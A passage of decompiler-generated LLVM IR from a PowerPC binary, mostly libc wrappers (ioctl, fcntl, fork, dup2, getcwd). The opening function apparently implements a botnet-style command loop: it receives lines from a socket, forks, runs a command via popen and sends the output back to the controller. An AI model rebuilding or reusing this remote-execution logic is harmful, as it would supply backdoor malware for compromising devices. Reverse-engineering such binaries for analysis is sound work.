  %storemerge746 = phi i8* [ %storemerge7, %dec_label_pc_10007404 ], [ %stack_var_-5780.029, %dec_label_pc_100073e0 ]
  %storemerge1445 = phi i32 [ %v1_10007430, %dec_label_pc_10007404 ], [ %v1_1000730c, %dec_label_pc_100073e0 ]
  %v3_10007408 = load i8, i8* %storemerge746, align 1
  %v4_10007408 = zext i8 %v3_10007408 to i32
  store i32 268465180, i32* @lr, align 4
  %v3_10007418 = call i32 @__GI_toupper(i32 %v4_10007408, i32 %storemerge1445)
  %v1_10007428 = trunc i32 %v3_10007418 to i8
  store i8 %v1_10007428, i8* %storemerge746, align 1
  %v1_10007430 = add i32 %storemerge1445, 1
  %storemerge7 = inttoptr i32 %v1_10007430 to i8*
  %v2_1000743c = load i8, i8* %storemerge7, align 1
  %v3_10007444 = icmp eq i8 %v2_1000743c, 0
  br i1 %v3_10007444, label %dec_label_pc_1000744c, label %dec_label_pc_10007404

dec_label_pc_1000744c:                            ; preds = %dec_label_pc_10007404, %dec_label_pc_100073e0
  store i32 ptrtoint ([11 x i8]* @global_var_100122ec.545 to i32), i32* @r4, align 4
  %v4_1000745c = call i32 @__GI_strcoll(i8* %stack_var_-5780.029, i32 ptrtoint ([11 x i8]* @global_var_100122ec.545 to i32))
  %v3_10007464 = icmp eq i32 %v4_1000745c, 0
  br i1 %v3_10007464, label %dec_label_pc_1000746c, label %dec_label_pc_10007558

dec_label_pc_1000746c:                            ; preds = %dec_label_pc_1000744c
  store i32 268465264, i32* @lr, align 4
  %v0_1000746c = call i32 @listFork()
  %v3_10007474 = icmp eq i32 %v0_1000746c, 0
  br i1 %v3_10007474, label %dec_label_pc_1000747c, label %dec_label_pc_100076dc.outer

dec_label_pc_1000747c:                            ; preds = %dec_label_pc_1000746c
  store i32 268465300, i32* @lr, align 4
  %v3_10007490 = call i32 @__GI_memset(i32 %v2_1000747c, i32 0, i32 1024)
  %v4_100074b0 = call i32 @szprintf(i32 %v2_1000747c, i32 ptrtoint ([8 x i8]* @global_var_100122f8.546 to i32), i32 %v1_100073f0)
  store i32 268465356, i32* @lr, align 4
  %v3_100074c8 = call i32 @fdpopen(i32 %v2_1000747c, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_10012228.524, i32 0, i32 0))
  br label %dec_label_pc_10007528

dec_label_pc_100074d8:                            ; preds = %dec_label_pc_10007528
  %v1_100074e0 = call i32 @trim(i32 %v2_1000747c)
  %v3_100074e8 = load i32, i32* @global_var_10024a28.27, align 4
  store i32 268465416, i32* @lr, align 4
  %v5_10007504 = call i32 @Rootsprintf(i32 %v3_100074e8, i32 ptrtoint ([3 x i8]* @global_var_10012300.547 to i32), i32 %v2_1000747c)
  store i32 ptrtoint ([3 x i8]* @global_var_10007520.548 to i32), i32* @lr, align 4
  %v3_1000751c = call i32 @__GI_memset(i32 %v2_1000747c, i32 0, i32 1024)
  store i32 268465448, i32* @lr, align 4
  %v1_10007524 = call i32 @sleep(i32 1)
  br label %dec_label_pc_10007528

dec_label_pc_10007528:                            ; preds = %dec_label_pc_1000747c, %dec_label_pc_100074d8
  %v3_10007538 = call i32 @fdgets(i32 %v2_1000747c, i32 1024, i32 %v3_100074c8)
  %v3_10007540 = icmp eq i32 %v3_10007538, 0
  br i1 %v3_10007540, label %dec_label_pc_10007548, label %dec_label_pc_100074d8

dec_label_pc_10007548:                            ; preds = %dec_label_pc_10007528
  %v1_1000754c = call i32 @fdpclose(i32 %v3_100074c8)
  %v0_10007554 = call i32 @__GI_exit()
  br label %dec_label_pc_10007558

dec_label_pc_10007558:                            ; preds = %dec_label_pc_1000744c, %dec_label_pc_10007548
  store i32 ptrtoint (i32* @global_var_10012304.551 to i32), i32* @r4, align 4
  store i32 268465524, i32* @lr, align 4
  %v4_10007570 = call i32 @__GI_strtok(i32 %v1_100073f0, i32 ptrtoint (i32* @global_var_10012304.551 to i32), i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32))
  store i32 %v1_1000730c, i32* %stack_var_-5472, align 4
  %v3_1000766850 = icmp eq i32 %v4_10007570, 0
  br i1 %v3_1000766850, label %dec_label_pc_10007670, label %dec_label_pc_10007588

dec_label_pc_10007588:                            ; preds = %dec_label_pc_10007558, %dec_label_pc_1000764c
  %stack_var_-5808.053.in = phi i32 [ %v4_10007658, %dec_label_pc_1000764c ], [ %v4_10007570, %dec_label_pc_10007558 ]
  %stack_var_-5804.151 = phi i32 [ %stack_var_-5804.0, %dec_label_pc_1000764c ], [ 1, %dec_label_pc_10007558 ]
  %stack_var_-5808.053 = inttoptr i32 %stack_var_-5808.053.in to i8*
  %v2_1000758c = load i8, i8* %stack_var_-5808.053, align 1
  %v3_10007594 = icmp eq i8 %v2_1000758c, 10
  br i1 %v3_10007594, label %dec_label_pc_1000764c, label %dec_label_pc_1000759c

dec_label_pc_1000759c:                            ; preds = %dec_label_pc_10007588
  store i32 %stack_var_-5804.151, i32* @r29, align 4
  store i32 %stack_var_-5808.053.in, i32* @r3, align 4
  %v0_100075a8 = call i32 @__GI_strlen()
  %v1_100075b0 = add i32 %v0_100075a8, 1
  store i32 %v1_100075b0, i32* @r3, align 4
  store i32 268465596, i32* @lr, align 4
  %v0_100075b8 = call i32 @malloc()
  %v0_100075c4 = load i32, i32* @r29, align 4
  %v1_100075c4 = mul i32 %v0_100075c4, 4
  %v1_100075d0 = add i32 %v1_100075c4, %v2_100076ac
  %v2_100075d4 = inttoptr i32 %v1_100075d0 to i32*
  store i32 %v0_100075b8, i32* %v2_100075d4, align 4
  %v1_100075dc = mul i32 %stack_var_-5804.151, 4
  %v1_100075e8 = add i32 %v1_100075dc, %v2_100076ac
  %v1_100075ec = inttoptr i32 %v1_100075e8 to i32*
  %v2_100075ec = load i32, i32* %v1_100075ec, align 4
  store i32 %stack_var_-5808.053.in, i32* @r3, align 4
  %v0_100075f8 = call i32 @__GI_strlen()
  %v1_10007600 = add i32 %v0_100075f8, 1
  store i32 268465688, i32* @lr, align 4
  %v3_10007614 = call i32 @__GI_memset(i32 %v2_100075ec, i32 0, i32 %v1_10007600)
  %v2_1000762c = load i32, i32* %v1_100075ec, align 4
  %v4_1000763c = call i32 @strcpy(i32 %v2_1000762c, i8* nonnull %stack_var_-5808.053)
  %v1_10007644 = add i32 %stack_var_-5804.151, 1
  br label %dec_label_pc_1000764c

dec_label_pc_1000764c:                            ; preds = %dec_label_pc_10007588, %dec_label_pc_1000759c
  %stack_var_-5804.0 = phi i32 [ %stack_var_-5804.151, %dec_label_pc_10007588 ], [ %v1_10007644, %dec_label_pc_1000759c ]
  store i32 ptrtoint (i32* @global_var_10012304.551 to i32), i32* @r4, align 4
  store i32 268465756, i32* @lr, align 4
  %v4_10007658 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10012304.551 to i32), i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32))
  %v3_10007668 = icmp eq i32 %v4_10007658, 0
  br i1 %v3_10007668, label %dec_label_pc_10007670, label %dec_label_pc_10007588

dec_label_pc_10007670:                            ; preds = %dec_label_pc_1000764c, %dec_label_pc_10007558
  %stack_var_-5804.1.lcssa = phi i32 [ 1, %dec_label_pc_10007558 ], [ %stack_var_-5804.0, %dec_label_pc_1000764c ]
  store i32 268465792, i32* @lr, align 4
  %v3_1000767c = call i32 @processCmd(i32 %stack_var_-5804.1.lcssa, i32* nonnull %stack_var_-5472)
  %tmp112 = icmp slt i32 %stack_var_-5804.1.lcssa, 2
  br i1 %tmp112, label %dec_label_pc_100076dc.outer, label %dec_label_pc_100076a0.lr.ph

dec_label_pc_100076a0.lr.ph:                      ; preds = %dec_label_pc_10007670
  store i32 1, i32* %stack_var_-5816, align 4
  br label %dec_label_pc_100076a0

dec_label_pc_100076a0:                            ; preds = %dec_label_pc_100076a0.lr.ph, %dec_label_pc_100076a0
  %v3_100076a0 = phi i32 [ 1, %dec_label_pc_100076a0.lr.ph ], [ %v1_100076c4, %dec_label_pc_100076a0 ]
  %v1_100076a4 = mul i32 %v3_100076a0, 4
  %v1_100076b0 = add i32 %v2_100076ac, %v1_100076a4
  %v1_100076b4 = inttoptr i32 %v1_100076b0 to i32*
  %v2_100076b4 = load i32, i32* %v1_100076b4, align 4
  store i32 %v2_100076b4, i32* @r3, align 4
  store i32 268465856, i32* @lr, align 4
  %v0_100076bc = call i32 @free()
  %v3_100076c0 = load i32, i32* %stack_var_-5816, align 4
  %v1_100076c4 = add i32 %v3_100076c0, 1
  store i32 %v1_100076c4, i32* %stack_var_-5816, align 4
  %v2_100076d4 = icmp slt i32 %v1_100076c4, %stack_var_-5804.1.lcssa
  br i1 %v2_100076d4, label %dec_label_pc_100076a0, label %dec_label_pc_100076dc.outer

dec_label_pc_100076dc.outer:                      ; preds = %dec_label_pc_100076a0, %dec_label_pc_10007264, %dec_label_pc_1000746c, %dec_label_pc_10007670, %dec_label_pc_100072c4, %dec_label_pc_10006e7c
  %stack_var_-5748.2.ph = phi i32 [ %stack_var_-5748.0.ph21, %dec_label_pc_10006e7c ], [ %stack_var_-5748.1, %dec_label_pc_100072c4 ], [ %stack_var_-5748.1, %dec_label_pc_10007670 ], [ %stack_var_-5748.1, %dec_label_pc_1000746c ], [ %stack_var_-5748.1, %dec_label_pc_10007264 ], [ %stack_var_-5748.1, %dec_label_pc_100076a0 ]
  br label %dec_label_pc_100076dc

dec_label_pc_100076dc:                            ; preds = %dec_label_pc_100076dc.outer, %dec_label_pc_100071ec
  %v3_100076e0 = load i32, i32* @global_var_10024a28.27, align 4
  %v5_100076f4 = call i32 @recvLine(i32 %v3_100076e0, i8* %v4_100076f4, i32 4096, i32 %v2_100076e4)
  %v4_10007708 = icmp eq i32 %v5_100076f4, -1
  br i1 %v4_10007708, label %dec_label_pc_10006e60.outer, label %dec_label_pc_1000713c

; uselistorder directives
  uselistorder i32 %v5_100076f4, { 1, 0 }
  uselistorder i32 %v1_100076c4, { 1, 2, 0 }
  uselistorder i32 %stack_var_-5804.1.lcssa, { 2, 1, 0 }
  uselistorder i32 %v4_10007658, { 1, 0 }
  uselistorder i8* %stack_var_-5808.053, { 1, 0 }
  uselistorder i32 %stack_var_-5804.151, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v1_10007430, { 1, 0 }
  uselistorder i32 %storemerge1445, { 1, 0 }
  uselistorder i8* %storemerge746, { 1, 0 }
  uselistorder i32 %v1_100073f0, { 1, 0 }
  uselistorder i8* %stack_var_-5780.029, { 3, 0, 4, 2, 1, 5 }
  uselistorder i32 %v1_1000730c, { 5, 0, 2, 1, 3, 6, 7, 4 }
  uselistorder i32 %v1_10007284, { 1, 0 }
  uselistorder i32 %v1_10007234, { 1, 2, 0 }
  uselistorder i32 %v2_10007168, { 1, 0 }
  uselistorder i32 %storemerge12, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32 %storemerge17, { 1, 0, 2 }
  uselistorder i32 %v1_10007070, { 1, 0 }
  uselistorder i32 %v0_10007054, { 1, 0 }
  uselistorder i32 %v3_10007008, { 1, 0 }
  uselistorder i32 %v1_10006f20, { 1, 3, 0, 2 }
  uselistorder i32 %v2_100076ac, { 2, 1, 0 }
  uselistorder i32 %v2_1000747c, { 4, 2, 1, 3, 5, 0, 6 }
  uselistorder i8* %v4_100076f4, { 1, 0 }
  uselistorder i32 %v2_100076e4, { 5, 1, 0, 3, 4, 6, 7, 8, 2 }
  uselistorder i32 %v3_10006d5c, { 1, 0, 2 }
  uselistorder i32 %v2_10006ce8, { 1, 0, 2 }
  uselistorder i32 %v2_10006cc0, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_10006c88, { 0, 2, 1 }
  uselistorder i32 %stack_var_-5756.0, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_10006b28, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %stack_var_-5816, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32, i32)* @__GI_strtok, { 9, 8, 7, 6, 5, 4, 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_10012304.551 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @fdgets, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @szprintf, { 1, 0 }
  uselistorder i32 ()* @listFork, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @trim, { 1, 0 }
  uselistorder i32* @global_var_10024a30.44, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32 (i32, i32, i32)* @Rootsprintf, { 15, 14, 13, 12, 11, 4, 3, 2, 1, 10, 9, 8, 7, 6, 5, 0 }
  uselistorder i32 (i32)* @sleep, { 1, 0 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 4, 3, 1, 2, 0 }
  uselistorder i8 47, { 1, 0 }
  uselistorder [2 x i8]* @global_var_10012228.524, { 1, 0 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_10012228.524 to i32), { 1, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_time, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 0, 5, 4, 3, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_10012210.519 to i32), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_100076dc.outer, { 0, 3, 2, 4, 1, 5 }
  uselistorder label %dec_label_pc_100076a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000764c, { 1, 0 }
  uselistorder label %dec_label_pc_10007588, { 1, 0 }
  uselistorder label %dec_label_pc_10007558, { 1, 0 }
  uselistorder label %dec_label_pc_10007528, { 1, 0 }
  uselistorder label %dec_label_pc_10007404, { 1, 0 }
  uselistorder label %dec_label_pc_100073e0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100073cc, { 1, 0 }
  uselistorder label %dec_label_pc_10007340, { 1, 0 }
  uselistorder label %dec_label_pc_1000729c, { 1, 0 }
  uselistorder label %dec_label_pc_10007264, { 1, 0 }
  uselistorder label %dec_label_pc_100071a8, { 1, 0 }
  uselistorder label %dec_label_pc_10007130, { 1, 0 }
  uselistorder label %dec_label_pc_100070ac, { 1, 0 }
  uselistorder label %dec_label_pc_1000706c, { 1, 0 }
  uselistorder label %dec_label_pc_10006f74, { 1, 0 }
  uselistorder label %dec_label_pc_10006f2c, { 1, 0 }
  uselistorder label %dec_label_pc_10006e70, { 1, 0 }
  uselistorder label %dec_label_pc_10006e60.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10006e40, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10006da4, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_10006c84, { 1, 0 }
  uselistorder label %dec_label_pc_10006c24, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-32 = alloca i32, align 4
  %v4_10007724 = icmp eq i32 %arg2, -2143521772
  %v2_10007738 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10007738, i32* %stack_var_-32, align 4
  br i1 %v4_10007724, label %dec_label_pc_10007798, label %dec_label_pc_10007758

dec_label_pc_10007758:                            ; preds = %entry
  %v3_10007758 = icmp ugt i32 %arg2, -2143521772
  br i1 %v3_10007758, label %dec_label_pc_10007770, label %dec_label_pc_10007760

dec_label_pc_10007760:                            ; preds = %dec_label_pc_10007758
  %v3_10007764 = icmp eq i32 %arg2, 1077703699
  br i1 %v3_10007764, label %dec_label_pc_1000778c, label %dec_label_pc_100077b8

dec_label_pc_10007770:                            ; preds = %dec_label_pc_10007758
  %v1_10007770 = xor i32 %arg2, -2143551488
  %v3_10007774 = icmp eq i32 %v1_10007770, 29717
  br i1 %v3_10007774, label %dec_label_pc_100077a8, label %dec_label_pc_1000777c

dec_label_pc_1000777c:                            ; preds = %dec_label_pc_10007770
  %v3_10007780 = icmp eq i32 %v1_10007770, 29718
  br i1 %v3_10007780, label %dec_label_pc_100077b0, label %dec_label_pc_100077b8

dec_label_pc_1000778c:                            ; preds = %dec_label_pc_10007760
  store i32 ptrtoint (i32* @global_var_10007794.552 to i32), i32* @lr, align 4
  %v1_10007790 = inttoptr i32 %arg3 to i32*
  %v2_10007790 = call i32 @__GI_tcgetattr(i32* %v1_10007790)
  br label %dec_label_pc_100077a0

dec_label_pc_10007798:                            ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1000779c

dec_label_pc_1000779c:                            ; preds = %dec_label_pc_100077b0, %dec_label_pc_100077a8, %dec_label_pc_10007798
  store i32 268466080, i32* @lr, align 4
  %v0_1000779c = call i32 @__GI_tcsetattr()
  br label %dec_label_pc_100077a0

dec_label_pc_100077a0:                            ; preds = %dec_label_pc_1000778c, %dec_label_pc_1000779c
  %storemerge = phi i32 [ %v0_1000779c, %dec_label_pc_1000779c ], [ %v2_10007790, %dec_label_pc_1000778c ]
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100077e4

dec_label_pc_100077a8:                            ; preds = %dec_label_pc_10007770
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_1000779c

dec_label_pc_100077b0:                            ; preds = %dec_label_pc_1000777c
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_1000779c

dec_label_pc_100077b8:                            ; preds = %dec_label_pc_1000777c, %dec_label_pc_10007760
  %v0_100077c8 = call i32 @__asm_mfcr()
  %v1_100077cc = and i32 %v0_100077c8, 268435456
  %v3_100077cc = icmp eq i32 %v1_100077cc, 0
  store i32 %v0_100077c8, i32* %r31.global-to-local, align 4
  br i1 %v3_100077cc, label %dec_label_pc_100077e4, label %dec_label_pc_100077d8

dec_label_pc_100077d8:                            ; preds = %dec_label_pc_100077b8
  %v0_100077d8 = call i32 @__errno_location()
  %v0_100077dc = load i32, i32* %r31.global-to-local, align 4
  %v2_100077dc = inttoptr i32 %v0_100077d8 to i32*
  store i32 %v0_100077dc, i32* %v2_100077dc, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100077e4

dec_label_pc_100077e4:                            ; preds = %dec_label_pc_100077b8, %dec_label_pc_100077a0, %dec_label_pc_100077d8
  %v0_100077e8 = phi i32 [ %v0_100077c8, %dec_label_pc_100077b8 ], [ %storemerge, %dec_label_pc_100077a0 ], [ -1, %dec_label_pc_100077d8 ]
  ret i32 %v0_100077e8

; uselistorder directives
  uselistorder i32 %arg2, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100077e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100077a0, { 1, 0 }
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_10007804 = load i32, i32* @lr, align 4
  %v1_10007804 = load i1, i1* @cr0_so, align 1
  %v2_10007804 = xor i1 %v1_10007804, true
  call void @__pseudo_cond_branch(i1 %v2_10007804, i32 %v0_10007804)
  %v0_10007808 = call i32 @__syscall_error()
  ret i32 %v0_10007808
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_10007820 = add i32 %arg2, -12
  %v2_10007824 = icmp ugt i32 %v1_10007820, 2
  %v2_1000782c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000782c, i32* %stack_var_-32, align 4
  br i1 %v2_10007824, label %dec_label_pc_10007858, label %dec_label_pc_10007848

dec_label_pc_10007848:                            ; preds = %entry
  store i32 268466256, i32* @lr, align 4
  %v2_1000784c = call i32 @__GI_fcntl64(i32 3)
  store i32 %v2_1000784c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007878

dec_label_pc_10007858:                            ; preds = %entry
  %v0_1000785c = call i32 @__asm_mfcr()
  %v1_10007860 = and i32 %v0_1000785c, 268435456
  %v3_10007860 = icmp eq i32 %v1_10007860, 0
  store i32 %v0_1000785c, i32* %r31.global-to-local, align 4
  br i1 %v3_10007860, label %dec_label_pc_10007878, label %dec_label_pc_1000786c

dec_label_pc_1000786c:                            ; preds = %dec_label_pc_10007858
  %v0_1000786c = call i32 @__errno_location()
  %v0_10007870 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007870 = inttoptr i32 %v0_1000786c to i32*
  store i32 %v0_10007870, i32* %v2_10007870, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007878

dec_label_pc_10007878:                            ; preds = %dec_label_pc_10007858, %dec_label_pc_10007848, %dec_label_pc_1000786c
  %v0_1000787c = phi i32 [ %v0_1000785c, %dec_label_pc_10007858 ], [ %v2_1000784c, %dec_label_pc_10007848 ], [ -1, %dec_label_pc_1000786c ]
  ret i32 %v0_1000787c

; uselistorder directives
  uselistorder label %dec_label_pc_10007878, { 2, 0, 1 }
}

define i32 @__GI_fcntl64(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_100078a8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_100078a8, i32* %stack_var_-32, align 4
  %v0_100078c4 = call i32 @__asm_mfcr()
  %v1_100078c8 = and i32 %v0_100078c4, 268435456
  %v3_100078c8 = icmp eq i32 %v1_100078c8, 0
  store i32 %v0_100078c4, i32* %r31.global-to-local, align 4
  br i1 %v3_100078c8, label %dec_label_pc_100078e0, label %dec_label_pc_100078d4

dec_label_pc_100078d4:                            ; preds = %entry
  %v0_100078d4 = call i32 @__errno_location()
  %v0_100078d8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100078d8 = inttoptr i32 %v0_100078d4 to i32*
  store i32 %v0_100078d8, i32* %v2_100078d8, align 4
  br label %dec_label_pc_100078e0

dec_label_pc_100078e0:                            ; preds = %entry, %dec_label_pc_100078d4
  %v0_100078f0 = phi i32 [ %v0_100078c4, %entry ], [ -1, %dec_label_pc_100078d4 ]
  ret i32 %v0_100078f0

; uselistorder directives
  uselistorder label %dec_label_pc_100078e0, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  br label %dec_label_pc_10007908

dec_label_pc_10007908:                            ; preds = %dec_label_pc_10007908.backedge, %entry
  %v0_10007914 = call i32 @__asm_mfcr()
  %v1_10007918 = and i32 %v0_10007914, 268435456
  %v3_10007918 = icmp eq i32 %v1_10007918, 0
  store i32 %v0_10007914, i32* %r31.global-to-local, align 4
  br i1 %v3_10007918, label %dec_label_pc_10007908.backedge, label %dec_label_pc_10007924

dec_label_pc_10007924:                            ; preds = %dec_label_pc_10007908
  %v0_10007924 = call i32 @__errno_location()
  %v0_10007928 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007928 = inttoptr i32 %v0_10007924 to i32*
  store i32 %v0_10007928, i32* %v2_10007928, align 4
  br label %dec_label_pc_10007908.backedge

dec_label_pc_10007908.backedge:                   ; preds = %dec_label_pc_10007924, %dec_label_pc_10007908
  br label %dec_label_pc_10007908
}

define i32 @chdir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007948 = call i32 @__asm_mfcr()
  %v1_1000794c = and i32 %v0_10007948, 268435456
  %v3_1000794c = icmp eq i32 %v1_1000794c, 0
  store i32 %v0_10007948, i32* %r31.global-to-local, align 4
  br i1 %v3_1000794c, label %dec_label_pc_10007964, label %dec_label_pc_10007958

dec_label_pc_10007958:                            ; preds = %entry
  %v0_10007958 = call i32 @__errno_location()
  %v0_1000795c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000795c = inttoptr i32 %v0_10007958 to i32*
  store i32 %v0_1000795c, i32* %v2_1000795c, align 4
  br label %dec_label_pc_10007964

dec_label_pc_10007964:                            ; preds = %entry, %dec_label_pc_10007958
  %v0_10007974 = phi i32 [ %v0_10007948, %entry ], [ -1, %dec_label_pc_10007958 ]
  ret i32 %v0_10007974

; uselistorder directives
  uselistorder label %dec_label_pc_10007964, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007990 = call i32 @__asm_mfcr()
  %v1_10007994 = and i32 %v0_10007990, 268435456
  %v3_10007994 = icmp eq i32 %v1_10007994, 0
  store i32 %v0_10007990, i32* %r31.global-to-local, align 4
  br i1 %v3_10007994, label %dec_label_pc_100079ac, label %dec_label_pc_100079a0

dec_label_pc_100079a0:                            ; preds = %entry
  %v0_100079a0 = call i32 @__errno_location()
  %v0_100079a4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100079a4 = inttoptr i32 %v0_100079a0 to i32*
  store i32 %v0_100079a4, i32* %v2_100079a4, align 4
  br label %dec_label_pc_100079ac

dec_label_pc_100079ac:                            ; preds = %entry, %dec_label_pc_100079a0
  %v0_100079bc = phi i32 [ %v0_10007990, %entry ], [ -1, %dec_label_pc_100079a0 ]
  ret i32 %v0_100079bc

; uselistorder directives
  uselistorder label %dec_label_pc_100079ac, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100079d8 = call i32 @__asm_mfcr()
  %v1_100079dc = and i32 %v0_100079d8, 268435456
  %v3_100079dc = icmp eq i32 %v1_100079dc, 0
  store i32 %v0_100079d8, i32* %r31.global-to-local, align 4
  br i1 %v3_100079dc, label %dec_label_pc_100079f4, label %dec_label_pc_100079e8

dec_label_pc_100079e8:                            ; preds = %entry
  %v0_100079e8 = call i32 @__errno_location()
  %v0_100079ec = load i32, i32* %r31.global-to-local, align 4
  %v2_100079ec = inttoptr i32 %v0_100079e8 to i32*
  store i32 %v0_100079ec, i32* %v2_100079ec, align 4
  br label %dec_label_pc_100079f4

dec_label_pc_100079f4:                            ; preds = %entry, %dec_label_pc_100079e8
  %v0_10007a04 = phi i32 [ %v0_100079d8, %entry ], [ -1, %dec_label_pc_100079e8 ]
  ret i32 %v0_10007a04

; uselistorder directives
  uselistorder label %dec_label_pc_100079f4, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007a20 = call i32 @__asm_mfcr()
  %v1_10007a24 = and i32 %v0_10007a20, 268435456
  %v3_10007a24 = icmp eq i32 %v1_10007a24, 0
  store i32 %v0_10007a20, i32* %r31.global-to-local, align 4
  br i1 %v3_10007a24, label %dec_label_pc_10007a3c, label %dec_label_pc_10007a30

dec_label_pc_10007a30:                            ; preds = %entry
  %v0_10007a30 = call i32 @__errno_location()
  %v0_10007a34 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007a34 = inttoptr i32 %v0_10007a30 to i32*
  store i32 %v0_10007a34, i32* %v2_10007a34, align 4
  br label %dec_label_pc_10007a3c

dec_label_pc_10007a3c:                            ; preds = %entry, %dec_label_pc_10007a30
  %v0_10007a4c = phi i32 [ %v0_10007a20, %entry ], [ -1, %dec_label_pc_10007a30 ]
  ret i32 %v0_10007a4c

; uselistorder directives
  uselistorder label %dec_label_pc_10007a3c, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r28, align 4
  %v3_10007a5c = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r30, align 4
  %v3_10007a6c = icmp eq i32 %arg1, 0
  br i1 %v3_10007a5c, label %dec_label_pc_10007a6c, label %dec_label_pc_10007aa0

dec_label_pc_10007a6c:                            ; preds = %entry
  br i1 %v3_10007a6c, label %dec_label_pc_10007a88, label %dec_label_pc_10007a74

dec_label_pc_10007a74:                            ; preds = %dec_label_pc_10007a6c
  %v0_10007a74 = call i32 @__errno_location()
  store i32 0, i32* @r30, align 4
  %v2_10007a80 = inttoptr i32 %v0_10007a74 to i32*
  store i32 22, i32* %v2_10007a80, align 4
  br label %dec_label_pc_10007b38

dec_label_pc_10007a88:                            ; preds = %dec_label_pc_10007a6c
  store i32 268466828, i32* @lr, align 4
  %v0_10007a88 = call i32 @__GI_getpagesize()
  %v1_10007a8c = icmp slt i32 %v0_10007a88, 4096
  %v0_10007a90. = select i1 %v1_10007a8c, i32 4096, i32 %v0_10007a88
  store i32 %v0_10007a90., i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007ab0

dec_label_pc_10007aa0:                            ; preds = %entry
  store i32 %arg2, i32* %r31.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  br i1 %v3_10007a6c, label %dec_label_pc_10007ab0, label %dec_label_pc_10007ac0

dec_label_pc_10007ab0:                            ; preds = %dec_label_pc_10007a88, %dec_label_pc_10007aa0
  %v0_10007ab0 = phi i32 [ %v0_10007a90., %dec_label_pc_10007a88 ], [ %arg2, %dec_label_pc_10007aa0 ]
  store i32 %v0_10007ab0, i32* @r3, align 4
  store i32 268466872, i32* @lr, align 4
  %v0_10007ab4 = call i32 @malloc()
  store i32 %v0_10007ab4, i32* @r29, align 4
  %v3_10007ab8 = icmp eq i32 %v0_10007ab4, 0
  br i1 %v3_10007ab8, label %dec_label_pc_10007b34, label %dec_label_pc_10007ab0.dec_label_pc_10007ac0_crit_edge

